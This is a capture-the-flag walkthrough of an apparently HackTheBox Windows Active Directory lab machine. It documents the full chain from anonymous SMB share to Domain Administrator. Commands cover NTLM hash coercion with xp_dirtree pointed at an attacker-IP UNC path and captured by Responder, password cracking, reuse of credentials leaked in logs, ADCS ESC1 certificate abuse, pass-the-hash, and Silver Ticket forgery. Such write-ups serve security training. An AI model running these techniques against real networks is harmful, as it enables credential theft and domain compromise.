
## Overview

**Platform:** HackTheBox **Operating System:** Windows (Active Directory — domain `sequel.htb`) **Difficulty:** Medium **Initial Access:** Anonymous SMB share → PDF leaks MSSQL creds → forced NTLM authentication capture via `xp_dirtree` → cracked service account hash → WinRM **Lateral Movement:** Credentials for a second user leaked in an MSSQL error log **Privilege Escalation:** ADCS ESC1 misconfigured certificate template → request a certificate as Administrator → extract NT hash **Final Access:** Domain Administrator (two independently valid paths — ESC1, or a Silver Ticket forged from the MSSQL service account's password hash)

### Key Techniques

- Full-port Nmap scan, service enumeration
- Recognizing AD from Nmap port spread (Kerberos, LDAP, etc.)
- Clock-skew awareness for Kerberos
- Anonymous/guest SMB share enumeration
- Credential harvesting from a document found on a share
- MSSQL client authentication (`impacket-mssqlclient`)
- Forcing outbound NTLM authentication via `xp_dirtree` + a UNC path
- Responder for NTLM hash capture
- `john` hash cracking
- WinRM authentication (`evil-winrm`)
- Log file review for leaked credentials
- Password reuse across accounts
- Active Directory Certificate Services (ADCS) enumeration (`Certify`)
- ESC1 vulnerable template identification
- Certificate request and NT hash extraction (`certipy`)
- Kerberos clock synchronization (`ntpdate`)
- Pass-the-hash over WinRM
- **Alternative path:** Silver Ticket forgery (`impacket-ticketer`) against a service with no registered SPN
- MSSQL `OPENROWSET` for arbitrary file read (flag retrieval without a full shell)

---

# Attack Path

```text
nmap -p- --min-rate=1000
        ↓
Wide Port Spread → Active Directory Indicators (Kerberos, LDAP, etc.)
        ↓
Add sequel.htb / dc.sequel.htb to /etc/hosts
        ↓
SMB: Anonymous / Guest Access to 'Public' Share
        ↓
Download "SQL Server Procedures.pdf" — Leaks MSSQL Credentials
        ↓
impacket-mssqlclient: Authenticate as PublicUser
        ↓
xp_dirtree UNC Path Forces MSSQL Service to Authenticate Outbound
        ↓
Responder Captures NTLM Hash for sql_svc
        ↓
john Cracks Hash — REGGIE1234ronnie
        ↓
evil-winrm as sql_svc
        ↓
Enumerate C:\sqlserver\Logs\ERRORLOG.bak
        ↓
Leaked Rejected-Login Attempt: ryan.cooper / NuclearMosquito3
        ↓
evil-winrm as ryan.cooper — user.txt Retrieved
        ↓
Certify.exe cas / find /vulnerable
        ↓
ESC1-Vulnerable Template Found: UserAuthentication
        ↓
certipy req — Certificate for administrator@sequel.htb
        ↓
Sync Clock (ntpdate) — Required for Kerberos
        ↓
certipy auth — Extract Administrator NT Hash
        ↓
evil-winrm Pass-the-Hash as Administrator
        ↓
root.txt Retrieved
        ↓
─── Alternative Path (from sql_svc creds alone) ───
Get Domain SID via Get-LocalUser
        ↓
Compute NT Hash for sql_svc's Password
        ↓
impacket-ticketer: Forge Silver Ticket for Administrator (No SPN Required)
        ↓
impacket-mssqlclient -k (Kerberos) as Administrator
        ↓
OPENROWSET Bulk File Read — user.txt / root.txt via SQL, No Shell Needed
```

---

# 1. Nmap Enumeration

```bash
ports=$(nmap -p- --min-rate=1000 -T4 <target> | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV <target>
```

A wide spread of open ports — Kerberos, LDAP, and related services — is a strong, immediate signal this is an **Active Directory domain controller**, not a standalone box.

Two hostnames identified from Nmap output: one for the domain itself, one for the DC.

```bash
echo "<target_ip> sequel.htb dc.sequel.htb" | sudo tee -a /etc/hosts
```

> [!warning] Kerberos Requires Tight Clock Sync Nmap output showed an 8-hour time difference between attacker and target. Kerberos authentication fails outright if the clock skew exceeds roughly 5 minutes — this needs to be corrected (`sudo ntpdate -u dc.<domain>`) **before** any Kerberos-dependent step, not just when something mysteriously stops working.

**MSSQL** on port `1433` stood out as a specific service worth prioritizing.

> [!tip] Recognition Pattern A large Nmap port spread with Kerberos (88), LDAP (389/636), SMB (445), and similar AD-associated ports together is close to a guarantee of an Active Directory environment. Set up `/etc/hosts` entries and clock sync as an immediate first step on any box that shows this pattern, before diving into individual service enumeration.

---

# 2. SMB Enumeration

No website on this box — SMB is the natural starting point.

```bash
smbclient -L \\\\sequel.htb\\
```

Blank/guest authentication (just press Enter for password) lists shares. Most are standard, but a share named **`Public`** stands out.

```bash
smbclient \\\\sequel.htb\\public
```

Connectable and browsable as guest. Found and downloaded a PDF:

```bash
get "SQL Server Procedures.pdf"
```

**The PDF contains MSSQL credentials directly.**

> [!tip] Recognition Pattern Documents left on accessible shares (PDFs, Word docs, spreadsheets, README/setup notes) are a very common and very direct credential-leak vector on AD boxes — always download and actually read anything found on an accessible share, not just note its existence.

---

# 3. Foothold — MSSQL → Forced NTLM Auth Capture

```bash
impacket-mssqlclient PublicUser:GuestUserCantWrite1@sequel.htb
```

Authenticated successfully. Nothing directly useful found by browsing the database itself — pivoted to a technique for forcing the **MSSQL service account** to authenticate outward, on the theory that if it runs as a real domain user (rather than a machine/service account), the captured hash would likely be crackable.

## Setting up the capture

```bash
responder -I tun0 -v
```

## Forcing outbound authentication

```sql
EXEC MASTER.sys.xp_dirtree '\\<attacker_ip>\test', 1, 1
```

`xp_dirtree` is a built-in MSSQL stored procedure for listing directory contents — pointing it at a UNC path on the attacker's machine forces the SQL Server service account to authenticate to that path via SMB, which Responder intercepts.

Captured an NTLMv2 hash for **`sql_svc`**.

> [!tip] Key Principle `xp_dirtree` (and its siblings `xp_fileexist`, `xp_subdirs`) are classic MSSQL primitives for coercing outbound NTLM authentication once any level of DB access is obtained — this works regardless of whether the DB account itself has meaningful data access, because the coercion happens at the _service account_ level, not the DB-login level. Worth trying immediately after landing any MSSQL access, even minimal.

## Cracking the captured hash

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

Cracked: `sql_svc:REGGIE1234ronnie`.

> [!tip] Recognition Pattern Service accounts (as opposed to machine accounts) are the ones worth targeting with this coercion technique — a machine account's hash is effectively uncrackable (long, randomly generated password), but a human-managed service account often has a crackable, dictionary-based password, exactly as happened here.

---

# 4. WinRM Access

```bash
evil-winrm -i sequel.htb -u sql_svc -p REGGIE1234ronnie
```

Shell as `sql_svc` — but the user flag isn't accessible from here directly.

---

# 5. Lateral Movement — Log File Credential Leak

```powershell
ls C:\users
```

Reveals a user `Ryan.Cooper` — a plausible flag-holder.

```powershell
type C:\sqlserver\Logs\ERRORLOG.bak
```

The MSSQL error log records a **failed login attempt** by `ryan.cooper`, including the plaintext password he mistakenly tried against the wrong service:

```text
ryan.cooper attempted login with password: NuclearMosquito3 (rejected)
```

> [!tip] Recognition Pattern Application/service error logs — especially for database services — frequently log failed authentication attempts in plaintext, including the password itself, precisely because the log doesn't know or care that the attempt failed for the _service_ it logged against. A rejected credential for one service is very often a valid credential for another (password reuse across services is extremely common) — always try it elsewhere.

```bash
evil-winrm -i sequel.htb -u ryan.cooper -p NuclearMosquito3
```

Works. User flag retrieved from `C:\Users\Ryan.Cooper\Desktop\user.txt`.

---

# 6. Privilege Escalation — ADCS ESC1

The Nmap output's heavy certificate-related service presence (from step 1) is the tell that an **Active Directory Certificate Services (ADCS)** Certificate Authority is running — a common and powerful AD privesc surface when templates are misconfigured.

## Enumerating with Certify

```powershell
upload Certify.exe
.\Certify.exe cas
```

Confirms a CA is present.

```powershell
.\Certify.exe find /vulnerable
```

Finds a template, **`UserAuthentication`**, vulnerable to the **ESC1** misconfiguration:

- Authenticated Users can enroll in the template.
- `msPKI-Certificate-Name-Flag` includes `ENROLLEE_SUPPLIES_OBJECT` — meaning the **requester themselves can specify the Subject Alternative Name (SAN)** on the certificate they're requesting.

> [!tip] Key Principle ESC1 in one sentence: if a certificate template lets a low-privileged, authenticated user both (a) enroll, and (b) supply their own SAN, they can request a certificate claiming to be _any other account_ — including Domain Admins — and that certificate will authenticate as the claimed identity. This is one of the most impactful and common ADCS misconfigurations, and `Certify`/`certipy`'s `find /vulnerable` scanning is the standard way to spot it.

## Exploiting with certipy

```bash
certipy req -u ryan.cooper@sequel.htb -p NuclearMosquito3 -upn administrator@sequel.htb -target sequel.htb -ca sequel-dc-ca -template UserAuthentication
```

Requests a certificate for the `UserAuthentication` template, but supplies `administrator@sequel.htb` as the UPN — exploiting exactly the ESC1 misconfiguration.

> [!note] Kerberos Timing Reminder Before this and the following Kerberos-dependent steps, clock sync is mandatory: `sudo ntpdate -u dc.sequel.htb`.

```bash
certipy auth -pfx administrator.pfx
```

Uses the obtained certificate to authenticate via Kerberos (PKINIT) and extract the **Administrator NT hash**.

## Pass-the-hash to finish

```bash
evil-winrm -i sequel.htb -u administrator -H <nt_hash>
```

Root flag retrieved from `C:\Users\Administrator\Desktop\root.txt`.

---

# 7. Alternative Path — Silver Ticket Against MSSQL

A second, independently valid route to Administrator access to the MSSQL service, requiring only the `sql_svc` credentials obtained earlier (no ADCS enumeration needed at all).

## The logic

Service tickets for a given service are encrypted with **that service account's own password hash** — meaning that if the MSSQL service runs as `sql_svc`, and the attacker knows `sql_svc`'s NT hash, a valid-looking service ticket for **any user** (including Administrator) can be **forged locally**, without ever contacting the domain's Kerberos service — this is the classic **Silver Ticket** technique.

> [!note] No SPN Complication Normally you'd request a real service ticket via Kerberos for a specific SPN. Here, there's **no SPN registered** for this MSSQL instance, so a normal Kerberos service-ticket request isn't possible. `impacket-ticketer`'s advantage is that it constructs the ticket **entirely offline/locally** — it doesn't need to ask the DC for anything, and since the _service itself_ (not Kerberos) is what validates a presented ticket, MSSQL will accept a well-forged ticket even though Kerberos was never involved in issuing it.

## Getting the domain SID

```bash
evil-winrm -i sequel.htb -u sql_svc -p REGGIE1234ronnie
Get-LocalUser -Name $env:USERNAME | Select sid
```

Domain SID = the user's SID with the final RID component removed.

## Getting sql_svc's NT hash

Computed from the already-known plaintext password (`REGGIE1234ronnie`) using any NTLM hash generator/online tool.

## Forging the ticket

```bash
impacket-ticketer -nthash <sql_svc_nt_hash> -domain-sid <domain_sid> -domain sequel.htb -dc-ip dc.sequel.htb -spn nonexistent/DC.SEQUEL.HTB Administrator
```

The `-spn` value can be arbitrary here specifically because no real SPN was registered to begin with — there's nothing to match against.

## Using the ticket

```bash
export KRB5CCNAME=Administrator.ccache
impacket-mssqlclient -k dc.sequel.htb
```

```sql
SELECT * FROM OPENROWSET(BULK N'C:\users\ryan.cooper\desktop\user.txt', SINGLE_CLOB) AS Contents
SELECT * FROM OPENROWSET(BULK N'C:\users\administrator\desktop\root.txt', SINGLE_CLOB) AS Contents
```

Both flags read directly through MSSQL's own bulk file-read functionality — **no interactive shell required at all** for this path.

> [!tip] Key Principle `OPENROWSET(BULK ..., SINGLE_CLOB)` is a legitimate MSSQL feature for reading external files into query results — once any level of DB access (including via a forged ticket) is achieved, it's a clean way to read arbitrary files the service account has filesystem permission for, without needing a full command-execution foothold.

---

# Recognition Patterns

|Observation|Investigate|
|---|---|
|Wide Nmap port spread including Kerberos/LDAP|Active Directory environment — set up `/etc/hosts` and clock sync immediately|
|Kerberos-dependent operations about to run|Check and correct clock skew (`ntpdate`) first|
|Any document accessible on an SMB share|Download and read fully — credentials are a common find|
|Any level of MSSQL access obtained|Try `xp_dirtree`/`xp_fileexist` to coerce outbound NTLM auth via Responder|
|Coerced hash belongs to a human-managed service account|High chance of being crackable — service accounts often have weak/dictionary passwords|
|Service error/log files accessible|Check for logged (even rejected) plaintext credentials|
|A rejected credential for one service|Try it against other services — password reuse is common|
|ADCS/CA-related indicators in scan output|Enumerate with Certify/certipy for vulnerable templates (ESC1 and siblings)|
|Have a service account's plaintext password/NT hash, but no SPN registered for its service|Consider a Silver Ticket via `impacket-ticketer` rather than requiring a normal Kerberos service-ticket request|
|Only need to read specific files, not a full shell|`OPENROWSET(BULK ...)` via any MSSQL access is a lightweight alternative to establishing a full foothold|

---

# Key Lessons

> [!tip] Recognize AD Environments Immediately From the Port Spread Kerberos, LDAP, and SMB together are a strong signal to set up hostname resolution and clock synchronization right away, before diving into individual services.

> [!tip] MSSQL Stored Procedures Are a Standing NTLM-Coercion Primitive `xp_dirtree` (and similar) should be tried the moment any MSSQL access is achieved, regardless of how limited that access otherwise seems — it targets the service account, not the DB login's own privileges.

> [!tip] Logs Leak Credentials Even When the Login Attempt Failed Error logs don't discriminate between successful and failed attempts when recording what was typed — always check service logs for plaintext credentials, and always try a "wrong" credential against other services.

> [!tip] ESC1 Is One of the Highest-Impact, Most Common ADCS Misconfigurations Whenever a CA is present, run `Certify find /vulnerable` or `certipy find` — enrollee-suppliable SANs on a broadly-enrollable template is a direct path to impersonating any account, including Domain Admins.

> [!tip] Multiple Independent Privesc Paths Can Exist on the Same AD Box This box has both an ADCS-based path (ESC1) and a completely separate Kerberos-abuse path (Silver Ticket) reachable from an earlier point in the chain — worth recognizing that AD boxes especially tend to have several valid escalation routes, and that a technique you already have the prerequisites for (a known service account password, here) may unlock a full path on its own without needing to find anything new.